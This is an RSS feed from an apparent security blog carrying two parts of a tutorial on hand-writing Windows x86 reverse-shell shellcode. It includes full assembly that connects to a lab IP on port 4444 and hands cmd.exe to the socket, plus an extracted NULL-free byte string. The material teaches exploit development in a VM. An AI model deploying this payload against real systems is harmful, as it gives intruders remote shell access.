<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Bugtree</title>
		<description>The Docs. Read them.</description>
		<link>/</link>
		<atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
		
			<item>
				<title>Windows x86 Manual Shellcode - Part 3</title>
				<description>&lt;p&gt;Continuation of &lt;a href=&quot;https://marcosvalle.github.io/re/exploit/2018/10/20/windows-manual-shellcode-part1.html&quot;&gt;part 1&lt;/a&gt; and &lt;a href=&quot;https://marcosvalle.github.io/re/exploit/2018/10/21/windows-manual-shellcode-part2.html&quot;&gt;part 2&lt;/a&gt; of the Windows x86 Manual Shellcode.&lt;/p&gt;

&lt;p&gt;In this part we will continue this development by redirecting a shell to to the established connection.&lt;/p&gt;

&lt;h2 id=&quot;call-createprocessa&quot;&gt;Call CreateProcessA&lt;/h2&gt;
&lt;p&gt;We already have the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateProcessA&lt;/code&gt; function we got with &lt;code class=&quot;highlighter-rouge&quot;&gt;arwin.exe&lt;/code&gt;. Its kind of obvious what this function does, but lets check the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createprocessa&quot;&gt;documentation&lt;/a&gt; just in case:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Creates a new process and its primary thread. The new process runs in the security context of the calling process.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;And the syntax:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This time, instead of trying to figure out each and every field of this structure, lets see if we can adapt &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_shell.asm&quot;&gt;Metasploit’s block_shell&lt;/a&gt; code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.shell:
	mov ebx, 0x646D6390    ; push our command line: 'cmd',0 padded with \x90
	shr ebx, 8
	push ebx
	mov ebx, esp           ; save a pointer to the command line
	push edi               ; our socket becomes the shells hStdError
	push edi               ; our socket becomes the shells hStdOutput
	push edi               ; our socket becomes the shells hStdInput
	xor esi, esi           ; Clear ESI for all the NULL's we need to push
	push byte 0x12         ; We want to place (18 * 4) = 72 null bytes onto the stack
	pop ecx                ; Set ECX for the loop

push_loop:
	push esi               ; push a null dword
	loop push_loop         ; keep looping untill we have pushed enough nulls
	mov word [esp + 0x3C], 0x0101 ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
	mov byte [esp + 0x10], 0x44
	lea eax, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure

  	;perform the call to CreateProcessA
	push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
	push eax               ; Push the pointer to the STARTUPINFO Structure
	push esi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
	push esi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
	push esi               ; We dont specify any dwCreationFlags 
	inc esi                ; Increment ESI to be one
	push esi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
	dec esi                ; Decrement ESI back down to zero
	push esi               ; Set lpThreadAttributes to NULL
	push esi               ; Set lpProcessAttributes to NULL
	push ebx               ; Set the lpCommandLine to point to &quot;cmd&quot;,0
	push esi               ; Set lpApplicationName to NULL as we are using the command line param instead

	mov ebx, 0x7c80236b    ; CreateProcessA
	call ebx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A few modifications were necessary, of course. First, we must set the correct address of &lt;code class=&quot;highlighter-rouge&quot;&gt;CreateProcessA&lt;/code&gt;. Also, since Metasploit uses &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm&quot;&gt;hashes instead of API calls&lt;/a&gt; to improve obfuscation, we had to change it too. I know, our shellcode is somewhat rudimentary, but it will be smaller I promise.&lt;/p&gt;

&lt;p&gt;There is also the good and old issue of the NULL bytes, which Metasploit does not address directly. Lets assemble/link this piece of code and see if there are any NULLs we must solve:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d /tmp/shell.exe -M intel32

/tmp/shell.exe:     file format pei-i386


Disassembly of section .text:

00401000 &amp;lt;.text&amp;gt;:
  401000:	68 63 6d 64 00       	push   0x646d63
  401005:	89 e3                	mov    ebx,esp
  401007:	57                   	push   edi
  401008:	57                   	push   edi
  401009:	57                   	push   edi
  40100a:	31 f6                	xor    esi,esi
  40100c:	6a 12                	push   0x12
  40100e:	59                   	pop    ecx
  40100f:	56                   	push   esi
  401010:	e2 fd                	loop   40100f &amp;lt;.text+0xf&amp;gt;
  401012:	66 c7 44 24 3c 01 01 	mov    WORD PTR [esp+0x3c],0x101
  401019:	8d 44 24 10          	lea    eax,[esp+0x10]
  40101d:	c6 00 44             	mov    BYTE PTR [eax],0x44
  401020:	54                   	push   esp
  401021:	50                   	push   eax
  401022:	56                   	push   esi
  401023:	56                   	push   esi
  401024:	56                   	push   esi
  401025:	46                   	inc    esi
  401026:	56                   	push   esi
  401027:	4e                   	dec    esi
  401028:	56                   	push   esi
  401029:	56                   	push   esi
  40102a:	53                   	push   ebx
  40102b:	56                   	push   esi
  40102c:	68 79 cc 3f 86       	push   0x863fcc79
  401031:	ff d5                	call   ebp
  401033:	89 e0                	mov    eax,esp
  401035:	4e                   	dec    esi
  401036:	56                   	push   esi
  401037:	46                   	inc    esi
  401038:	ff 30                	push   DWORD PTR [eax]
  40103a:	68 08 87 1d 60       	push   0x601d8708
  40103f:	ff d5                	call   ebp
[...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice that both &lt;code class=&quot;highlighter-rouge&quot;&gt;push 0x646d63&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;mov BYTE PTR [eax],0x44&lt;/code&gt; add NULL bytes.&lt;/p&gt;

&lt;p&gt;To solve the first issue, we transform &lt;code class=&quot;highlighter-rouge&quot;&gt;push 0x00646D63&lt;/code&gt; into:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	mov ebx, 0x646D6390    ;push our command line: 'cmd',0 padded with \x90
	shr ebx, 8	       ;rotate right (ebx = 0x00646D63)
	push ebx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For the second one, we transform this snippet:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	lea eax, [esp + 0x10]    ; Set EAX as a pointer to our STARTUPINFO Structure
	mov byte [eax], 0x44     ; Set the size of the STARTUPINFO Structure
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Into:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	mov byte [esp + 0x10], 0x44
	lea eax, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This works because we eliminate the &lt;code class=&quot;highlighter-rouge&quot;&gt;mov BYTE PTR [eax],0x44&lt;/code&gt;, which was causing the problem.&lt;/p&gt;

&lt;p&gt;Finally, lets extract the shellcode and see if it is NULL-free.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ objdump -d Public/ctp/shellcode.exe|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/&quot;/'|sed 's/$/&quot;/g'
&quot;\x31\xc0\x66\xb8\x33\x32\x50\x68\x77\x73\x32\x5f\x54\xbb\x7b\x1d\x80\x7c\xff\xd3\x89\xc5\x31\xc0\x66\xb8\x75\x70\x50\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x55\xbb\x40\xae\x80\x7c\xff\xd3\x31\xdb\x66\xbb\x90\x01\x29\xdc\x54\x31\xc9\x66\xb9\x02\x02\x51\xff\xd0\x31\xc0\x66\xb8\x74\x41\x50\x68\x6f\x63\x6b\x65\x68\x57\x53\x41\x53\x54\x55\xbb\x40\xae\x80\x7c\xff\xd3\x31\xdb\x53\x53\x53\x31\xc9\xb1\x06\x51\x43\x53\x43\x53\xff\xd0\x50\x5f\x31\xc0\xb8\x90\x65\x63\x74\xc1\xe8\x08\x50\x68\x63\x6f\x6e\x6e\x54\x55\xbb\x40\xae\x80\x7c\xff\xd3\xbb\xd1\xb9\x11\x1c\x81\xeb\x11\x11\x11\x11\x53\x66\x68\x11\x5c\x31\xdb\xb3\x02\x66\x53\x89\xe2\x6a\x10\x52\x57\xff\xd0\xbb\x90\x63\x6d\x64\xc1\xeb\x08\x53\x89\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\xc6\x44\x24\x10\x44\x8d\x44\x24\x10\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\xbb\x6b\x23\x80\x7c\xff\xd3&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome! To test it, we set a listener on port 4444 at our server and run it in the Windows VM.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_listener.png&quot; alt=&quot;1-listener&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, there is still a small problem:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_crash.png&quot; alt=&quot;2-crash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since we did not correctly finish the process, it crashes. By now you should be fully confident about how to fix this issue, so I won’t spoil it ;)&lt;/p&gt;

&lt;p&gt;This is our final shellcode therefore:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start

section .text

_start:

.loadWinSock:
	xor eax, eax

	mov ax, 0x3233			;23
	push eax				;includes \0 at the end without insert NULLs
	push 0x5f327377 		;_2sw
	push esp			;pointer to the string

	mov ebx, 0x7c801d7b		;0x7b1d807c  	;addr of LoadLibraryA (0x7c801d7b)
	call ebx

	mov ebp, eax			;save winsock handle

.getWSAStartup:
	xor eax, eax

	mov ax, 0x7075      ; 'up'
	push eax
	push 0x74726174     ; 'trat'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;winsock handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx

.callWSAStartUp:
	xor ebx, ebx
	mov bx, 0x0190
	sub esp, ebx
	push esp
	xor ecx, ecx
	mov cx, 0x0202
	push ecx

	call eax		; WSAStartUp(MAKEWORD(2, 2), wsadata_pointer)


.getWSASocketA:
	xor eax, eax

	mov ax, 0x4174      ; 'At'
	push eax
	push 0x656b636f     ; 'ekco'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx

.callWSASocketA:
	xor ebx, ebx		;clear ebx
	push ebx;		;dwFlags=NULL
	push ebx;		;g=NULL
	push ebx;		;lpProtocolInfo=NULL
	
	xor ecx, ecx		;clear ecx
	mov cl, 0x6		;protocol=6
	push ecx

	inc ebx			;ebx==1
	push ebx		;type=1
	inc ebx			;af=2
	push ebx

	call eax		;call WSASocketA

	push eax		;save eax in edx
	pop edi			;...

.getConnect:
	xor eax, eax

	mov eax, 0x74636590     ;'\x90tce'
	shr eax, 8
	push eax
	push 0x6e6e6f63     ;'nnoc'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx

.callConnect:
	;set up sockaddr_in
	mov ebx, 0x1c11b9d1	;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.0.11)
	sub ebx, 0x11111111	;subtract from ebx to obtain the real IP
	push ebx		;push sin_addr
	push word 0x5c11	;0x115c = (port 4444)

	xor ebx, ebx
	mov bl, 2
	push bx	
	mov edx, esp

	push byte 0x10
	push edx
	push edi

	call eax

.shell:
	mov ebx, 0x646D6390    ; push our command line: 'cmd',0 padded with \x90
	shr ebx, 8
	push ebx
	mov ebx, esp           ; save a pointer to the command line
	push edi               ; our socket becomes the shells hStdError
	push edi               ; our socket becomes the shells hStdOutput
	push edi               ; our socket becomes the shells hStdInput
	xor esi, esi           ; Clear ESI for all the NULL's we need to push
	push byte 0x12         ; We want to place (18 * 4) = 72 null bytes onto the stack
	pop ecx                ; Set ECX for the loop

push_loop:
	push esi               ; push a null dword
	loop push_loop         ; keep looping untill we have pushed enough nulls
	mov word [esp + 0x3C], 0x0101 ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
	mov byte [esp + 0x10], 0x44
	lea eax, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure

  	;perform the call to CreateProcessA
	push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
	push eax               ; Push the pointer to the STARTUPINFO Structure
	push esi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
	push esi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
	push esi               ; We dont specify any dwCreationFlags 
	inc esi                ; Increment ESI to be one
	push esi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
	dec esi                ; Decrement ESI back down to zero
	push esi               ; Set lpThreadAttributes to NULL
	push esi               ; Set lpProcessAttributes to NULL
	push ebx               ; Set the lpCommandLine to point to &quot;cmd&quot;,0
	push esi               ; Set lpApplicationName to NULL as we are using the command line param instead

	mov ebx, 0x7c80236b    ; CreateProcessA
	call ebx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_memewin.jpg&quot; alt=&quot;3-WIN&quot; /&gt;&lt;/p&gt;
</description>
				<pubDate>Sun, 21 Oct 2018 00:00:00 -0300</pubDate>
				<link>/re/exploit/2018/10/21/windows-manual-shellcode-part3.html</link>
				<guid isPermaLink="true">/re/exploit/2018/10/21/windows-manual-shellcode-part3.html</guid>
			</item>
		
			<item>
				<title>Windows x86 Manual Shellcode - Part 2</title>
				<description>&lt;p&gt;In &lt;a href=&quot;https://marcosvalle.github.io/re/exploit/2018/10/20/windows-manual-shellcode-part1.html&quot;&gt;part 1&lt;/a&gt; we started developing a shellcode from scratch until the point where we loaded &lt;code class=&quot;highlighter-rouge&quot;&gt;WSAStartup&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;In this part we will continue this development until the successfull connection from the victim machine with the server.&lt;/p&gt;

&lt;h2 id=&quot;call-wsastartup&quot;&gt;Call WSAStartup&lt;/h2&gt;
&lt;p&gt;Last thing we did was finding the address of WSAStartup. In order to use it lets check the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsastartup&quot;&gt;required syntax&lt;/a&gt;:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int WSAStartup(
  WORD      wVersionRequired,
  LPWSADATA lpWSAData
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And also:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;wVersionRequired&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;The highest version of Windows Sockets specification that the caller can use. The high-order byte specifies the minor version number; the low-order byte specifies the major version number.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;lpWSAData&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;A pointer to the WSADATA data structure that is to receive details of the Windows Sockets implementation.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Now we must find out the size of the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winsock/ns-winsock-wsadata&quot;&gt;WSADATA&lt;/a&gt; structure so we can allocate some space for it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef struct WSAData {
  WORD           wVersion;
  WORD           wHighVersion;
  unsigned short iMaxSockets;
  unsigned short iMaxUdpDg;
  char           *lpVendorInfo;
  char           szDescription[WSADESCRIPTION_LEN + 1];
  char           szSystemStatus[WSASYS_STATUS_LEN + 1];
} WSADATA;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Although it seems at first we should simply sum each attribute size to get the total size occupied by this structure, that is generally not a good way to go. You can check &lt;a href=&quot;https://stackoverflow.com/questions/119123/why-isnt-sizeof-for-a-struct-equal-to-the-sum-of-sizeof-of-each-member&quot;&gt;here&lt;/a&gt; why the size of a &lt;code class=&quot;highlighter-rouge&quot;&gt;struct&lt;/code&gt; is not necessarily the same as the sum of its attibutes’ sizes.&lt;/p&gt;

&lt;p&gt;I wrote a quick and dirty C script to find it out:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include&amp;lt;stdio.h&amp;gt;
#include&amp;lt;winsock2.h&amp;gt;
 
int main(int argc , char *argv[])
{
    WSADATA wsa;
    printf(&quot;%x&quot;, sizeof(wsa));
 
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And compile it with:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;i686-w64-mingw32-gcc winsock.c -o shared/winsock.exe -lws2_32
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_wsadatasize.png&quot; alt=&quot;1-WSAData size&quot; /&gt;&lt;/p&gt;

&lt;p&gt;With that in mind we can now set 2.2 as the &lt;code class=&quot;highlighter-rouge&quot;&gt;wVersionRequired&lt;/code&gt; (check &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsastartup&quot;&gt;MS docs&lt;/a&gt; for more) and write the following code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.callWSAStartup:
	xor ebx, ebx			;clear ebx
	mov bx, 0x0190			;set the lower bytes of ebx to the size of WSAData struct
	sub esp, ebx			;open space for receiving the WSAData struct
	push esp			;save a pointer to the WSAData struct
	xor ecx, ecx			;clear ecx
	mov cx, 0x0202			;set the lower bytes of ecx to the version of winsock (2.2)
	push cx				;push wVersionRequired (2.2)

	call eax			;call WSAStartup(MAKEWORD(2, 2), wsadata_pointer)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lets put everything together and see how it goes inside a debugger:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg4.png&quot; alt=&quot;2-dbg4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;According to &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winsock/nf-winsock-wsastartup&quot;&gt;MS docs&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If successful, the WSAStartup function returns zero. Otherwise, it returns one of the error codes listed below.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Cool, it seems like we are all set to call &lt;code class=&quot;highlighter-rouge&quot;&gt;WSAStartup&lt;/code&gt;. For now, lets check how does &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/blob/76954957c740525cff2db5a60bcf936b4ee06c42/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm&quot;&gt;Metasploit’s reverse_tcp&lt;/a&gt; does it:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
  sub esp, eax           ; alloc some space for the WSAData structure
  push esp               ; push a pointer to this stuct
  push eax               ; push the wVersionRequested parameter
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Interesting, they reduce a few bytes by using the version as the same value of the size of WSAData. Lets assemble/link this code and debug it:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;global _start

section .text

_start:

.loadWinSock:
	xor eax, eax

	mov ax, 0x3233			;23
	push eax				;includes \0 at the end without insert NULLs
	push 0x5f327377 		;_2sw
	push esp			    ;pointer to the string

	mov ebx, 0x7c801d7b		;addr of LoadLibraryA (0x7c801d7b)
	call ebx

	mov ebp, eax			;save winsock handle

.getWSAStartup:
	xor eax, eax

	mov ax, 0x7075          ;'pu'
	push eax
	push 0x74726174         ;'trat'
	push 0x53415357         ;'SASW'
	push esp	            ;pointer to the string

	push ebp	            ;winsock handler
	
	mov ebx, 0x7c80ae40     ;addr of GetProcAddress
	call ebx

.callWSAStartUp:
	mov ebx, 0x0190        ; EAX = sizeof( struct WSAData )
	sub esp, ebx           ; alloc some space for the WSAData structure
	push esp               ; push a pointer to this stuct
	push ebx               ; push the wVersionRequested parameter
	
	call eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice we changed &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;ebx&lt;/code&gt; since we have saved &lt;code class=&quot;highlighter-rouge&quot;&gt;WSAStartup&lt;/code&gt;’s address in the first register.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/media/manualshellcode/shellcode_dbg5.png&quot; alt=&quot;2-dbg4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It seems to be working fine too, even though they used a &lt;code class=&quot;highlighter-rouge&quot;&gt;wVersionRequired&lt;/code&gt; other than &lt;code class=&quot;highlighter-rouge&quot;&gt;2.2&lt;/code&gt;. If we read the &lt;em&gt;Remarks&lt;/em&gt; section from the documentation more carefully we figure out the reason why:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;If the version requested by the application is equal to or higher than the lowest version supported by the Winsock DLL, the call succeeds and the Winsock DLL returns detailed information in the WSADATA structure pointed to by the lpWSAData parameter.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;And also:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;It is legal and possible for an application or DLL written to use a lower version of the Windows Sockets specification that is supported by the Winsock DLL to successfully negotiate this lower version using the WSAStartup function. For example, an application can request version 1.1 in the wVersionRequested parameter passed to the WSAStartup function on a platform with the Winsock 2.2 DLL. In this case, the application should only rely on features that fit within the version requested.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;get-wsasocketa-with-getprocaddress&quot;&gt;Get WSASocketA with GetProcAddress&lt;/h2&gt;
&lt;p&gt;This step is simmilar to &lt;code class=&quot;highlighter-rouge&quot;&gt;Get WSAStartup with GetProcAddress&lt;/code&gt;. The only difference is the string used.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.getWSASocketA:
	xor eax, eax

	mov ax, 0x4174      ; 'At'
	push eax
	push 0x656b636f     ; 'ekco'
	push 0x53415357     ; 'SASW'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;call-wsasocketa&quot;&gt;Call WSASocketA&lt;/h2&gt;
&lt;p&gt;From the &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/winsock2/nf-winsock2-wsasocketa&quot;&gt;docs&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The WSASocket function creates a socket that is bound to a specific transport-service provider.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;And for the syntax:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SOCKET WSAAPI WSASocketA(
  int                 af,		//2 (IPv4)
  int                 type,		//1 (SOCK_STREAM)
  int                 protocol,		//6 (IPPROTO_TCP)
  LPWSAPROTOCOL_INFOA lpProtocolInfo,	//NULL
  GROUP               g,		//0 (no group operation)
  DWORD               dwFlags		//NULL
);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Lets set up the stack:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.callWSASocketA:
	xor ebx, ebx		;clear ebx
	push ebx;		;dwFlags=NULL
	push ebx;		;g=NULL
	push ebx;		;lpProtocolInfo=NULL
	
	xor ecx, ecx		;clear ecx
	mov cl, 0x6		;protocol=6
	push ecx

	inc ebx			;ebx==1
	push ebx		;type=1
	inc ebx			;af=2
	push ebx

	call eax		;call WSASocketA

	push eax		;save eax in edx
	pop edi			;...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Notice we used &lt;code class=&quot;highlighter-rouge&quot;&gt;push ebx&lt;/code&gt; to push NULL bytes without actually writing any NULLs in our shellcode. We also used a little trick to reduce a few bytes. Instead of setting &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;bl&lt;/code&gt;, we used &lt;code class=&quot;highlighter-rouge&quot;&gt;ecx&lt;/code&gt;. Why? Because we knew in advance we would need to push &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1&lt;/code&gt;and &lt;code class=&quot;highlighter-rouge&quot;&gt;0x2&lt;/code&gt; right after, so we decided to keep &lt;code class=&quot;highlighter-rouge&quot;&gt;ebx&lt;/code&gt;as 0 and increment it later. This way we ‘skipped’ &lt;code class=&quot;highlighter-rouge&quot;&gt;0x6&lt;/code&gt; and used &lt;code class=&quot;highlighter-rouge&quot;&gt;ebx&lt;/code&gt; to save some bytes.&lt;/p&gt;

&lt;p&gt;We also save the file descriptor of the newly created socket in &lt;code class=&quot;highlighter-rouge&quot;&gt;edi&lt;/code&gt;, so we keep &lt;code class=&quot;highlighter-rouge&quot;&gt;eax&lt;/code&gt; free to receive the next return value.&lt;/p&gt;

&lt;h2 id=&quot;get-connect-with-getprocaddress&quot;&gt;Get connect with GetProcAddress&lt;/h2&gt;
&lt;p&gt;Pretty much the same as we have been doing so far to get functions addresses.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;.getConnect:
	xor eax, eax

	mov eax, 0x74636590     ;'\x90tce'
	shr eax, 8
	push eax
	push 0x6e6e6f63     ;'nnoc'
	push esp	    ;pointer to the string

	push ebp	    ;socket handler
	
	mov ebx, 0x7c80ae40 ;addr of GetProcAddress
	call ebx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

